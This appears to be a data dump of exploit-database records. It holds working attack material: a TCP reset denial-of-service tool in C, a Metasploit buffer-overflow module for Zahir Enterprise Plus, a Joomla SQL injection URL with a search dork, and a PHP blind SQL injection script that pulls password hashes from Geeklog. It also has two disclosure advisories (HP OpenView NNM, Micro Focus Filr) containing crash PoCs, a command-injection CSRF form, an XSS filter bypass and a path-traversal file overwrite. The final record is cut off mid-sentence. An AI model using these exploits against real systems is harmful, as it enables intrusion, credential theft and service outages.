291,"TCP Connection Reset - Remote Denial of Service /* By: Paul A. Watson Build a TCP packet - based on tcp1.c sample code from libnet-1.1.1  COMPILE: gcc reset-tcp.c -o reset-tcp /usr/lib/libnet.a or gcc -o reset-tcp reset-tcp.c -lnet ** be sure to modify the MAC addresses (enet_src/enet_dst) in the code, or you WILL have problems!  EXECUTE: reset-tcp [interface] [src ip] [src port] [dst ip] [dst port] [window size]  EXAMPLE (and timing packets sent with /bin/date): [root@orc BGP]# date; ./reset-tcp eth1 172.16.0.1 1 172.16.0.2 2 65536; date Tue Dec 16 21:18:28 CST 2003 Packets sent: 8192 Sequence guess: 536805376 Packets sent: 16384 Sequence guess: 1073676288 Packets sent: 24576 Sequence guess: 1610547200 Packets sent: 32768 Sequence guess: 2147418112 Packets sent: 40960 Sequence guess: 2684289024 Packets sent: 49152 Sequence guess: 3221159936 Packets sent: 57344 Sequence guess: 3758030848 packets sent: 65535 Tue Dec 16 21:18:46 CST 2003 [root@orc BGP]# */  /* modified by: J. Barber A.K.A Swoop modified to use src mac from your interface and asks for the  destination mac on the command line.  New Command-Line Example: ./reset-tcp eth1 172.16.0.1 1 172.16.0.2 2 00:01:02:03:04:05 65536  swoopafied: 3/30/04 */  #include <libnet.h> #include <stdio.h>  int main(int argc, char *argv[]) { int c; unsigned long int count=0; unsigned long int count2=0; unsigned long int seqguess=0; unsigned long int seqstart=0; unsigned long int seqincrement=0; unsigned long int seqmax=4294967295; u_char *cp; libnet_t *l; libnet_ptag_t t; char *payload; char * device = argv[1]; u_short payload_s; u_long src_ip, dst_ip; u_short src_prt, dst_prt; char errbuf[LIBNET_ERRBUF_SIZE];  char sourceip[32] = """"; char destinationip[32] = """";  /* Change these to suit your local environment values */ /* Make enet_dst either the default gateway or destination host */ struct libnet_ether_addr *ptr_enet_src; u_char enet_src[6]; u_char enet_dst[6]; u_char org_code[3] = {0x00, 0x00, 0x00};  /* Its only test code, so minimal checking is performed... */ if (argc<8) {  printf(""TCP Reset Tool v1.2\nBy Paul Watson - Modified by J. Barber\n""); printf(""Usage: %s [interface] [src ip] [src port] [dst ip] [dst port] [gateway/destination MAC]  [window size]\n"",argv[0]);  printf(""Example: ./reset-tcp eth1 172.16.0.1 1 172.16.0.2 2 00:01:02:03:04:05 65536\n""); exit(1); }  strcpy(sourceip,argv[2]); src_prt = atoi(argv[3]); strcpy(destinationip,argv[4]); dst_prt = atoi(argv[5]); seqincrement= atoi(argv[7]); seqstart= 0; seqmax = 4294967295; /* 2^32 */  payload = NULL; payload_s = 0; src_ip = libnet_name2addr4(l,sourceip,LIBNET_DONT_RESOLVE); dst_ip = libnet_name2addr4(l,destinationip,LIBNET_DONT_RESOLVE);  memset(enet_dst, 0, sizeof(enet_dst)); sscanf(argv[6], ""%02X:%02X:%02X:%02X:%02X:%02X"", &enet_dst[0], &enet_dst[1], &enet_dst[2], &enet_dst[3], &enet_dst[4], &enet_dst[5]);  l = libnet_init(LIBNET_LINK,device,errbuf); ptr_enet_src = libnet_get_hwaddr(l); memcpy(&enet_src[0], ptr_enet_src,6); printf(""Src MAC: %02X:%02X:%02X:%02X:%02X:%02X\n"", enet_src[0], enet_src[1],enet_src[2],enet_src[3], enet_src[4],enet_src[5]); printf(""Dst MAC: %02X:%02X:%02X:%02X:%02X:%02X\n"", enet_dst[0], enet_dst[1],enet_dst[2],enet_dst[3], enet_dst[4],enet_dst[5]);  for (seqguess=seqstart;seqguess<seqmax-seqincrement;seqguess=seqguess+seqincrement) { count++; count2++; if (count2==8192) { count2=0; printf(""Packets sent: %lu\tSequence guess: %lu\n"",count,seqguess); } l = libnet_init(LIBNET_LINK,device,errbuf); t = libnet_build_tcp(src_prt,dst_prt,seqguess,0x00000001,TH_RST,0,0,0,LIBNET_TCP_H,NULL,0,l,0); t = libnet_build_tcp(src_prt,dst_prt,seqguess,0x00000001,TH_RST,0,0,0,LIBNET_TCP_H,NULL,0,l,0); t = libnet_build_ipv4(LIBNET_IPV4_H+LIBNET_TCP_H+payload_s,0,242,0,64,IPPROTO_TCP,0,src_ip,dst_ip,NULL,0,l,0);  t = libnet_build_ethernet(enet_dst,enet_src,ETHERTYPE_IP,NULL,0,l,0); c = libnet_write(l); } printf(""packets sent: %i\n"",count); return (EXIT_FAILURE);  }",TCP Connection Reset,1
45560,"Zahir Enterprise Plus 6 - Stack Buffer Overflow (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit   Rank = NormalRanking    include Msf::Exploit::FILEFORMAT   include Msf::Exploit::Seh    def initialize(info={})     super(update_info(info,       'Name'           => ""Zahir Enterprise Plus 6 Stack Buffer Overflow"",       'Description'    => %q{        This module exploits a stack buffer overflow in Zahir Enterprise Plus version 6 build 10b and below.        The vulnerability is triggered when opening a CSV file containing CR/LF and overly long string characters        via Import from other File. This results in overwriting a structured exception handler record.       },       'License'         => MSF_LICENSE,       'Author'          =>         [           'f3ci',       # initial discovery           'modpr0be'    # poc and Metasploit Module         ],       'References'      =>         [           [ 'CVE', '2018-17408' ],           [ 'EDB', '45505' ]         ],       'Platform'        => 'win',       'Targets'         =>         [           ['Zahir Enterprise Plus 6 <= build 10b',             {               #P/P/R from vclie100.bpl (C:\Program Files\Zahir Personal 6 - Demo Version\vclie100.bpl)               'Ret'     => 0x52016661,               'Offset'  => 3041             }           ]         ],       'Payload'         =>         {           'Space'       => 5000,           'BadChars'    => ""\x00\x0a\x0d\x22\x2c"",           'DisableNops'     => true         },       'DisclosureDate'  => 'Sep 28 2018',       'DefaultTarget'   => 0))      register_options(     [       OptString.new('FILENAME', [true, 'The malicious file name', 'msf.csv'])     ])   end    def exploit     buf = rand_text_alpha_upper(target['Offset'])     buf << ""\r\n""   # crash chars     buf << rand_text_alpha_upper(380) # extra chars to hit the offset     buf << generate_seh_record(target.ret)     buf << payload.encoded      file_create(buf)   end end",Zahir Enterprise Plus,1
24851,"Joomla! Component com_rsfiles - 'cid' SQL Injection ******************************************************************************* # Title   :  Joomla Component RSfiles <= (cid) SQL injection Vulnerability # Author  :  ByEge # Contact :  http://byege.blogspot.com # Date    :  18.03.2013 # S.Page  :  http://www.rsjoomla.com # Dork    :  inurl:index.php?option=com_rsfiles # DorkEx  :  http://www.google.com.tr/#hl=tr&sclient=psy-ab&q=inurl:index.php?option=com_rsfiles  Vulnerability : ?option=com_rsfiles&view=files&layout=agreement&tmpl=component&cid=1/**/aNd/**/1=0/**/uNioN++sElecT+1,CONCAT_WS(CHAR(32,58,32),user(),database(),version())--  [[SQL Injection Test]]]  http://server/?option=com_rsfiles&view=files&layout=agreement&tmpl=component&cid=1/**/aNd/**/1=0/**/uNioN++sElecT+1,CONCAT_WS(CHAR(32,58,32),user(),database(),version())--  ********************************* # Turkey.",Joomla! Component,1
10176,"HP OpenView Network Node Manager (OV NNM) 7.53 - Invalid DB Error Code -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1        Core Security Technologies - CoreLabs Advisory            http://www.coresecurity.com/corelabs/    HP Openview NNM 7.53 Invalid DB Error Code vulnerability    1. *Advisory Information*  Title: HP Openview NNM 7.53 Invalid DB Error Code vulnerability Advisory Id: CORE-2009-0814 Advisory URL: http://www.coresecurity.com/content/openview_nnm_internaldb_dos Date published: 2009-11-17 Date of last update: 2009-11-17 Vendors contacted: HP Release mode: Coordinated release   2. *Vulnerability Information*  Class: External Initialization of Trusted Variables [CWE-454] Impact: Denial of Service Remotely Exploitable: Yes Locally Exploitable: No Bugtraq ID: N/A CVE Name: CVE-2009-3840   3. *Vulnerability Description*  HP Openview Network Node Manager is one of the most widely-deployed network monitoring and management platforms used throughout enterprise organizations today. The platform includes many server and client-side core components with a long list of previously disclosed security bugs. In this case, a remotely exploitable vulnerability was found in the database server core component used by NNM. Exploitation of the bug does not require authentication and will lead to a remotely triggered denial of service of the internal database service.   4. *Vulnerable packages*     . HP Openview NNM 7.53  Other versions may be vulnerable but were not tested. Refer to the vendor's security bulletin for a full list.   5. *Non-vulnerable packages*  Refer to the vendor's security bulletin.   6. *Vendor Information, Solutions and Workarounds*  The vendor issued security bulletin HPSBMA02477 SSRT090177 to address the problem and provide fixes. It is available at http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c01926980  The database service of HP Openview Network Node Manager is remotely accessible on port 2690/tcp. Restricting or blocking access to that port will prevent exploitation but may prevent normal operation of Openview NNM.   7. *Credits*  This vulnerability was discovered and researched by Damian Frizza from Core Security Technologies.   8. *Technical Description / Proof of Concept Code*   8.1. *HP Openview NNM 7.53 Embedded DB Remote Denial Of Service*  HP Openview Network Node Manager includes an embedded database engine service that is enabled by default and accepts remote connections on port 2690/tcp. The service is implemented by the 'ovdbrun.exe' which is started automatically on boot. For certain transactions upon receiving a packet from the network the service will attempt to determine and display an error code string based on an error code number specified in the packet. By sending a specifically crafted packet with an invalid error code number it is possible to remotely trigger an exception that forces abnormal termination of the service. It is unlikely that the bug could be exploited for anything other than a remote denial of service.  The following code excerpt explains the problem:  /----- 005FED51   MOVZX EDX,BYTE PTR SS:[ESP+2]     #FCFF 005FED56   MOVSX ECX,WORD PTR SS:[ESP+3] 005FED5B   CMP ECX,-1 005FED5E   MOVSX EAX,WORD PTR SS:[ESP+5]     #FCFF 005FED63   MOV DWORD PTR DS:[ESI+10],EDX 005FED66   MOV EDX,DWORD PTR SS:[ESP+7] 005FED6A   MOV DWORD PTR DS:[ESI+14],ECX 005FED6D   MOV DWORD PTR DS:[ESI+18],EAX 005FED70   MOV DWORD PTR DS:[ESI+C],EDX 005FED73   JGE SHORT ovdbrun.005FED7E 005FED75   CMP EAX,-1 005FED78   JGE SHORT ovdbrun.005FED7E 005FED7A   CMP ECX,EAX 005FED7C   JE SHORT ovdbrun.005FED83 005FED7E   MOV EAX,1 005FED83   ADD ESP,0C 005FED86   RETN  - -----/  The code above checks for an error condition based on the value of an Error Code field in the inbound network packet. An error condition is explicitly handled if the Error Code value is less or equal than -1 in which case a MessageBox with a corresponding descriptive error string will be presented to the user. However by crafting a packet with any negative value in the Error Code field different that -1 the lookup for the corresponding error string will fail triggering a non-recoverable error and thus terminating the server process.  The following python code can be used to reproduce the bug:  /----- #!python import socket import struct  a =  struct.pack('<b', 2) a += struct.pack('<H', 0) a += struct.pack('<H',0xFEFF) a += struct.pack('<H',0xFEFF) a += ""1234""  target_ip = 'X.X.X.X'  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) s.connect ((target_ip, 2690))  s.send(a) s.close()  - -----/    8.2. *Additional information: Low severity bugs in ActiveDom.ocx ActiveX*  The ActiveX control 'ActiveDom.ocx' is shipped with HP Openview NNM 7.53 and installed by default. The control is prone to multiple memory corruption bugs due to erroneous handling of overly long strings passed to multiple methods. These bugs are considered of low severity because the control is not configured as Safe for Scripting or Safe for Initialization [1] and therefore cannot be exploited without explicit user consent. Since the control was reported by the vendor as not used nor required by any component of OpenView NNM, finding deployed systems with security configuration settings changed to allow exploitation of these bugs is very unlikely. Nonetheless information about them is included below for the purpose of completeness in the documentation of this advisory.  Some of the ActiveX control's methods with implementation flaws are:  /----- DisplayName(str) AddGroup(str) InstallComponent(str) Subscribe(str, str, int)  - -----/  The following excerpt from method DisplayName() demonstrates the problem:  /----- 2000D408   MOV DWORD PTR SS:[EBP-4],-1 2000D40F   JMP SHORT ACTIVE~1.2000D3D6 2000D411   MOV EAX,ACTIVE~1.200361A0 2000D416   JMP <JMP.&MSVCRT.__CxxFrameHandler> 2000D41B   MOV EAX,ACTIVE~1.2000D4A8 2000D420   CALL <JMP.&MSVCRT._EH_prolog> 2000D425   SUB ESP,10 2000D428   PUSH EBX 2000D429   PUSH ESI 2000D42A   PUSH EDI 2000D42B   MOV DWORD PTR SS:[EBP-10],ESP 2000D42E   MOV DWORD PTR SS:[EBP-14],ECX 2000D431   XOR EBX,EBX 2000D433   MOV DWORD PTR SS:[EBP-4],EBX 2000D436   LEA ESI,DWORD PTR DS:[ECX+28] 2000D439   MOV ECX,DWORD PTR DS:[ESI]        ; ESI = 00038178 2000D43B   MOV EAX,DWORD PTR DS:[ECX]        ; 2000D43D   CALL DWORD PTR DS:[EAX+48]        ;  - -----/  The following HTML code can be used to trigger the bug:  /----- <html> <object classid='clsid:A801FD2B-6FA8-11D0-BB85-00AA00A7EAAE' id='target'      </object>  <script> a = """" for (i = 0; i < 10000; i++)    a = a + ""A"" target.DisplayName(a) </script> </html>   - -----/    9. *Report Timeline*  . 2009-08-12: Core Security Technologies notifies the HP Software Security Response Team (SSRT) of the vulnerability and preliminary schedule to publish the corresponding security advisory on September 8th 2009. Core asks for acknowledgement of the email within 2 working days and whether HP SSRT prefers to receive the technical description of the bug encrypted or in plaintext.  . 2009-08-12: HP SSRT asks Core to send the technical description of the vulnerability encrypted using the PGP key with id 0x08B83D45.  . 2009-08-14: Core Security Technologies sends technical details encrypted to HP SSRT.  . 2009-08-18: HP SSRT informs Core that HP engineering have been notified and will notify Core when they have a schedule estimate. SSRT assigned the IDs SSRT090177 and SSRT090178 to the vulnerabilities reported by Core.  . 2009-08-27: Core requests a status update from HP SSRT.  . 2009-08-27: HP SSRT informs Core that the vulnerabilities are in third-party code and that the third-party vendor has been notified but there isn't a schedule for fixes yet. HP SSRT indicates that it is sure HP will not have a solution ready by September 7th.  . 2009-08-27: Core informs the HP team that the publication was re-scheduled to September 21st and requests an update to continue coordinating the release of fixes and publication of the advisory as soon as possible.  . 2009-08-28: The HP team informs Core that the third party if planning a release on October 30th for the first vulnerability. SSRT also notes that ActiveX vulnerabilities are still being investigated.  . 2009-08-31: Core Security Technologies acknowledges the information sent by HP SSRT.  . 2009-09-01: The HP team communicates that they will inform Core Security Technologies when the fix is available.  . 2009-09-04: Core asks the HP SSRT to map HP's internal IDs to each of the reported vulnerability.  . 2009-09-04: The HP SSRT indicates that SSRT090177 corresponds to the embedded database vulnerability and SSRT090178 to the ActiveX bugs.  . 2009-09-10: Core Security Technologies notifies HP SSRT that publication of the advisory has been re-scheduled to October 30th to be able to coordinate the release with the issuance of fixes by the third party vendor and that if non-third-party vulnerabilities (the ActiveX bugs) could be fixed earlier they would be described in a separate advisory.  . 2009-09-11: HP SSRT says that it will send any new information to Core on the ActiveX bugs if they have something to publish before October 30th.  . 2009-09-21: The HP team informs Core that they are having some problems reproducing the ActiveX vulnerabilities reported. The NNM engineers have used the provided proof-of-concept exploit but did not see any effect. SSRT asks if an overflow was confirmed, if process failure was detected and if a debugger or a different procedure was used.  . 2009-09-21: Core Security Technologies notifies the HP SSRT that the proof of concept crash can be observed using a classic debugger or a just-in-time debugger that is attached only after an abnormal exception is detected. Core also sends HP SSRT another proof of concept HTML code that crashes the ActiveX and can be observed without the need of a debugger.  . 2009-09-22: The HP team acknowledges previous email from Core with the new PoC to reproduce the crashes without a debugger.  . 2009-10-06: Core requests a status update from the SSRT noting that it hasn't received any update since September 22nd. The advisory is still scheduled for publication on October 30th and Core is waiting for confirmation that the ActiveX bugs were reproduced and the fix for them could be published earlier separately.  . 2009-10-09: SSRT updates indicating that fixes from the third party for SSRT090177 have been received and HP is currently in the process of testing them on all platforms expecting an update by October 16th. The ActiveX bugs have been reproduced and HP determined that the vulnerable control is not necessary for NNM. HP will recommend customers to set the kill bit for the control (clsid:A801FD2B-6FA8-11D0-BB85-00AA00A7EAAE) as workaround.  . 2009-10-19: Core requests a status update and confirmation that HP will be ready to release fixes by October 30th. Core asks if fixes will be issued for all vulnerable versions of NNM, whether the fixes or patches will remove the unnecessary ActiveX control or just ask customers to implement the workaround. Core requests the complete lists of vulnerable versions and platforms of NNM and asks if the patches will include fixes to other bugs. Also, Core notes that the vendor of the third party component has been identified and that since the bug may affect other products Core will start a separate vulnerability report process directly with that vendor.  . 2009-11-02: Email from Core asking for a status update and an acknowledgement and response to the questions from the previous email. Core notes that the previously agreed publication date for the advisory has already passed without any update from HP. The publication date has been unilaterally moved to Wednesday November 4th. 2009 and is considered final pending a response from HP.  . 2009-11-03: Response from HP SSRT stating that there is not an estimated release date for patches to some platforms. With regards to the ActiveX bugs, a security bulletin will be published on November 9th recommending setting the kill bit.  . 2009-11-03: Core indicates that since there isn't an estimated patch release date for missing platforms the advisory will be published on November 9th and will include guidance on how to implement workarounds for both problems. Core asks SSRT about the potential impact of blocking or restricting access to the vulnerable service as a workaround.  . 2009-11-05: SSRT suggests that given that Core advisory will be published earlier than HP's security bulletin it should have workarounds for all platforms and not just for the ones that may not have a patch available afterwards. HP is still investigating the impact of blocking or restricting access to the vulnerable port. SSRT asks if Core wants any acknowledgement in its security bulletin  . 2009-11-05: Core asks what is the planned publication date for HP's bulletin and requests that the bulletin credits the discoverer (Damian Frizza). Provided that the estimated date for publishing the bulletin is not unreasonable Core would rather schedule the publication of the advisory to match HP's.  . 2009-11-06: SSRT informs that their estimate is to have hotfixes available internally by November 13th and released along with the corresponding security bulletins by November 17th. SSRT ask whether CVE numbers should be assigned by HP or provided by Core.  . 2009-11-06: Core re-schedules publication to November 17th. Core asks SSRT to assign the CVE numbers.  . 2009-11-12: HP SSRT reports that the ActiveX control is not marked as safe for scripting or safe for initialization by default and thus the buffer overflows in its methods do not seem to be security issues. Asks if Core still considers them security vulnerabilities.  . 2009-11-16: HP SSRT provides the CVE id assigned to the denial of service bug. Indicates that the vendor's security bulletin will not suggest any workarounds as the effect of blocking or restricting access to the vulnerable service has not been determined.  . 2009-11-16: Core confirms that the ActiveX control is not marked as safe for scripting or initialization which greatly diminishes the relevance of the reported bugs. Nonetheless, the information about the bugs will be included in the advisory for the purpose of completeness and to let users verify, and if necessary correct, the control's configuration settings. Core still recommends the vendor to remove the unnecessary control from installation packages and fix the reported bugs to avoid potential introduction of flaws if it becomes a used control in the future or should an alternative exploitation vector be found.  . 2009-11-17: Publication of HP Security Bulletin SSRT090177.  . 2009-11-17: Advisory CORE-2009-0814 published.    10. *References*  [1] Safe Initialization and Scripting for ActiveX Controls. http://msdn.microsoft.com/en-us/library/aa751977(VS.85).aspx [2] How to stop an ActiveX control from running in Internet Explorer. http://support.microsoft.com/kb/240797   11. *About CoreLabs*  CoreLabs, the research center of Core Security Technologies, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://www.coresecurity.com/corelabs.   12. *About Core Security Technologies*  Core Security Technologies develops strategic solutions that help security-conscious organizations worldwide develop and maintain a proactive process for securing their networks. The company's flagship product, CORE IMPACT, is the most comprehensive product for performing enterprise security assurance testing. CORE IMPACT evaluates network, endpoint and end-user vulnerabilities and identifies what resources are exposed. It enables organizations to determine if current security investments are detecting and preventing attacks. Core Security Technologies augments its leading technology solution with world-class security consulting services, including penetration testing and software security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core Security Technologies can be reached at 617-399-6980 or on the Web at http://www.coresecurity.com.   13. *Disclaimer*  The contents of this advisory are copyright (c) 2009 Core Security Technologies and (c) 2009 CoreLabs, and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.   14. *PGP/GPG Keys*  This advisory has been signed with the GPG key of Core Security Technologies advisories team, which is available for download at http://www.coresecurity.com/files/attachments/core_security_advisories.asc. -----BEGIN PGP SIGNATURE----- Version: GnuPG v1.4.8 (MingW32) Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/  iEYEARECAAYFAksDICYACgkQyNibggitWa2//ACdFpN6SK4B59Iza5Nq88oASfat YhoAn24UcNlJ/lpKv4brl4d6mctKfwMF =cR49 -----END PGP SIGNATURE-----",HP OpenView Network Node Manager (OV NNM),1
32914,"Geeklog 1.5.2 - 'usersettings.php' SQL Injection source: https://www.securityfocus.com/bid/34553/info  Geeklog is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  Geeklog 1.5.2 and earlier are vulnerable.  tmp); $i++) {            $tmp_i = explode("";"", $tmp[$i]);            $cookies .= $tmp_i[0].""; "";        }        if (stripos ($cookies, ""\x70\x61\x73\x73\x77\x6f\x72\x64"")) {            return $cookies;        } else {            die(""[*] Unable to login!"");        }     }     function xtrct_prefix() {        global $host, $port, $path, $cookies, $url;        $out = _s($url, $cookies, 0, """");        $tmp = explode(""\x62\x6c\x6f\x63\x6b\x73\x5b\x5d"", $out);        if (count($tmp) < 2) {            die(""[!] Not logged in!"");        }        $tmp = explode(""\x22"", $tmp[0]);        $prefix = $tmp[count($tmp)-1];        return $prefix;    }     function is_checked() {        global $host, $port, $path, $cookies, $url;        $out = _s($url, $cookies, 0, """");        $tmp = explode(""\x62\x6c\x6f\x63\x6b\x73\x5b\x5d"", $out);        $tmp = explode(""\x3e"", $tmp[1]);        $s = $tmp[0];        if (stripos ($s, ""\x22\x63\x68\x65\x63\x6b\x65\x64\x22"")) {            return 1;        } else {            return 0;        }    }     if (!$_use_ck) {        $cookies = login();    }     $url = ""http://$host:$port"".$path.""usersettings.php"";    $prefix = xtrct_prefix();    print ""[*] prefix->'"".$prefix.""'\n"";     if (!$_skiptest) {        run_test();    }    if ($_test) {        die;    }     #uncheck all boxes    $rst_sql = ""0) AND 0 UNION SELECT 1,0x61646d696e5f626c6f636b FROM "".$prefix.""users WHERE "".$where."" LIMIT 1/*"";    $out = _s($url, $cookies, 1, ""mode=savepreferences&"".$prefix.""blocks[0]="".urlencode($rst_sql).""&"");    #then start extraction    $c = array();    $c = array_merge($c, range(0x30, 0x39));    $c = array_merge($c, range(0x61, 0x66));    $url = ""http://$host:$port"".$path;    $_hash = """";    print (""[*] Initiating hash extraction ...\n"");    for ($j = 1; $j < 0x21; $j++) {        for ($i = 0; $i <= 0xff; $i++) {            $f = false;            if (in_array($i, $c)) {                $sql = ""0) AND 0 UNION SELECT 1,IF(ASCII(SUBSTR(passwd FROM $j FOR 1))=$i,1,0x61646d696e5f626c6f636b) FROM "".$prefix.""users WHERE "".$where."" LIMIT 1/*"";                $url = ""http://$host:$port"".$path.""usersettings.php"";                $out = _s($url, $cookies, 1, ""mode=savepreferences&"".$prefix.""blocks[0]="".urlencode($sql).""&"");                if (is_checked()) {                    $f = true;                    $_hash .= chr($i);                    print ""[*] Md5 Hash: "".$_hash.str_repeat(""?"", 0x20-$j).""\n"";                    #if found , uncheck again                    $out = _s($url, $cookies, 1, ""mode=savepreferences&"".$prefix.""blocks[0]="".urlencode($rst_sql).""&"");                    break;                }            }        }        if ($f == false) {            die(""\n[!] Unknown error ..."");        }    }    print ""[*] Done! Cookie: geeklog=$uid; password="".$_hash."";\n""; ?>",Geeklog,1
40161,"Micro Focus Filr 2 2.0.0.421/1.2 1.2.0.846 - Multiple Vulnerabilities SEC Consult Vulnerability Lab Security Advisory < 20160725-0 > =======================================================================               title: Multiple vulnerabilities              product: Micro Focus (former Novell) Filr Appliance  vulnerable version: Filr 2 <=2.0.0.421, Filr 1.2 <= 1.2.0.846       fixed version: Filr 2 v2.0.0.465, Filr 1.2 v1.2.0.871          CVE number: CVE-2016-1607, CVE-2016-1608, CVE-2016-1609                      CVE-2016-1610, CVE-2016-1611              impact: critical            homepage: https://www.novell.com/products/filr/               found: 2016-05-23                  by: W. Ettlinger (Office Vienna)                      SEC Consult Vulnerability Lab                        An integrated part of SEC Consult                      Bangkok - Berlin - Linz - Montreal - Moscow                      Singapore - Vienna (HQ) - Vilnius - Zurich                       https://www.sec-consult.com =======================================================================  Vendor description: ------------------- ""Unlike other mobile file access and collaborative file sharing solutions, Micro Focus Filr has been designed with the enterprise in mind, resulting in less administration, better security and more productive users.""  URL: https://www.novell.com/products/filr/   Business recommendation: ------------------------ During a very quick security check several vulnerabilities with high impact  have been discovered. SEC Consult recommends to immediately apply the patches  provided by Micro Focus to address these issues.   Please note that since SEC Consult did not conduct a thorough technical security check SEC Consult cannot make a statement regarding the overall security of the Micro Focus Filr appliance.   Vulnerability overview/description: ----------------------------------- During a quick security check several vulnerabilities have been identified that  ultimately allow an attacker to completely compromise the appliance:  1) Cross Site Request Forgery (CSRF) - CVE-2016-1607 Several functions within the appliance's administative interface lack protection against CSRF attacks. This allows an attacker who targets an authenticated  administrator to reconfigure the appliance.  2) OS Command Injection - CVE-2016-1608 The appliance administrative interface allows an authenticated attacker to  execute arbitrary operating system commands. Please note that an attacker can  combine this vulnerability with vulnerability #1. In this scenario, an attacker  does not need to be authenticated.  3) Insecure System Design The appliance uses a Jetty application server to provide the appliance  administration interface. This application server is started as the superuser  ""root"". Please note that combined with vulnerability #1 and #2 an attacker can run commands as the superuser ""root"" without the need for any authentication. For vendor remark on #3 see solution section.  4) Persistent Cross-Site Scripting - CVE-2016-1609 The Filr web interface uses a blacklist filter to try to strip any JavaScript  code from user input. However, this filter can be bypassed to persistently  inject JavaScript code into the Filr web interface.  5) Missing Cookie Flags The httpOnly cookie flag is not set for any session cookies set by both the  administrative appliance web interface and the Filr web interface. Please note  that combined with vulnerability #4 an attacker can steal session cookies of  both the appliance administration interface and the Filr web interface (since  cookies are shared across ports). For vendor remark on #5 see solution section.  6) Authentication Bypass - CVE-2016-1610 An unauthenticated attacker is able to upload email templates.  7) Path Traversal - CVE-2016-1610 The functionality that allows an administrator to upload email templates fails  to restrict the directory the templates are uploaded to. Please note that  combined with vulnerability #6 an attacker is able to upload arbitray files with the permissions of the system user ""wwwrun"".  8) Insecure File Permissions - CVE-2016-1611 A file that is run upon system user login is world-writeable. This allows a local  attacker with restricted privileges to inject commands that are being executed as privileged users as soon as they log into the system. Please note that  combined with vulnerabilities #6 and #7 an unauthenticated attacker can inject  commands that are executed as privileged system users (e.g. root) using the Filr web interface.   Proof of concept: ----------------- 1, 2, 3) The following HTML fragment demonstrates that using a CSRF attack (#1) system  commands can be injected (#2) that are executed as the user root (#3):  ----- snip ----- <html>   <body>     <form action=""https://<host>:9443/vaconfig/time"" method=""POST"">       <input type=""hidden"" name=""ntpServer"" value=""0.novell.pool.ntp.org 1.novell.pool.ntp.org';id>/tmp/test;'"" />       <input type=""hidden"" name=""region"" value=""europe"" />       <input type=""hidden"" name=""timeZone"" value=""Europe/Vienna"" />       <input type=""hidden"" name=""utc"" value=""true"" />       <input type=""hidden"" name=""_utc"" value=""on"" />       <input type=""submit"" value=""Submit request"" />     </form>   </body> </html> ----- snip -----  4) The following string demonstrates how the XSS filter can be circumvented: <img src='>' onerror='alert(1)'>  This string can e.g. be used by a restricted user in the ""phone"" field of the  user profile. The script is executed by anyone viewing the profile (e.g. admins).  5) None of the session cookies are set with the httpOnly flag.  6, 7, 8) The following Java fragment demonstrates how an unauthenticated attacker (#6)  can overwrite a file in the filesystem (#7 & #8) that is executed upon user login  of e.g. the root user:  ----- snip ----- String sessionCookie = ""sectest""; String host = ""http://<host>/"";  ProxySettings settings = new ProxySettings(); HttpCookie cookie = new HttpCookie(""JSESSIONID"", sessionCookie);  settings.setCookieManager(new CookieManager()); settings.getCookieManager().getCookieStore().add(new URI(host), cookie);  settings.setModuleBaseUrl(host + ""ssf/gwt/""); settings.setRemoteServiceRelativePath(""gwtTeaming.rpc""); settings.setPolicyName(""338D4038939D10E7FC021BD64B318D99""); GwtRpcService svc = SyncProxy.createProxy(GwtRpcService.class, settings);  VibeXsrfToken token = new VibeXsrfToken( 		StringUtils.toHexString(Md5Utils.getMd5Digest(sessionCookie.getBytes()))); ((HasRpcToken) svc).setRpcToken(token);  String fileName = ""../../../../etc/profile.d/vainit.sh""; FileBlob fileBlob = new FileBlob(ReadType.TEXT, fileName, """", 1l, 4, 1l, false, 4l); fileBlob.setBlobDataString(""id > /tmp/profiledtest\n""); BinderInfo folderInfo = new BinderInfo(); folderInfo.setBinderId((long) 1); folderInfo.setBinderType(BinderType.WORKSPACE); folderInfo.setWorkspaceType(WorkspaceType.EMAIL_TEMPLATES); VibeRpcCmd cmd = new UploadFileBlobCmd(folderInfo, fileBlob, true); HttpRequestInfo ri = new HttpRequestInfo(); svc.executeCommand(ri, cmd); ----- snip -----   Vulnerable / tested versions: ----------------------------- The version 2.0.0.421 of Micro Focus Filr was found to be vulnerable. This version  was the latest version at the time of the discovery.  According to the vendor, Filr 1.2 is also vulnerable.    Vendor contact timeline: ------------------------ 2016-05-23: Sending encrypted advisory to security@novell.com, Setting latest             possible release date to 2016-07-12 2016-05-24: Initial response from Micro Focus: forwarded the information to Filr             engineering team 2016-06-13: Micro Focus releases patch to address issue #8 2016-06-14: Requested status update 2016-06-14: Micro Focus expects release of the patches in early July 2016-06-30: Asking for status update, answer of Micro Focus 2016-07-06: Micro Focus needs more time to patch issues, release re-scheduled for 15th 2016-07-12: Asking for status update; ""final rounds of QA"" at Micro Focus 2016-07-16: Postponing advisory release, patch not yet ready 2016-07-22: Patch release by Micro Focus 2016-07-25: Coordinated advisory release     Solution: --------- The ""Filr 2.0 Security Update 2"" can be downloaded here and should be applied immediately: https://download.novell.com/Download?buildid=3V-3ArYN85I~ Those patches fix vulnerabilities #1, #2, #4, #6, #7  ""Filr 1.2 Security Update 3"" can be found here: https://download.novell.com/Download?buildid=BOTiHcBFfv0~   Knowledge base references at Micro Focus: Issue #1: https://www.novell.com/support/kb/doc.php?id=7017786 Issue #2: https://www.novell.com/support/kb/doc.php?id=7017789 Issue #4: https://www.novell.com/support/kb/doc.php?id=7017787 Issue #6 & #7: https://www.novell.com/support/kb/doc.php?id=7017788  Local privilege escalation via insecure file permissions (#8) has already been fixed in the Filr 2.0 security update 1 in June: https://www.novell.com/support/kb/doc.php?id=7017689   Issue #3: According to Micro Focus, Jetty actually runs as user  ""vabase-jetty"" but will pass commands off to another service on the box that runs 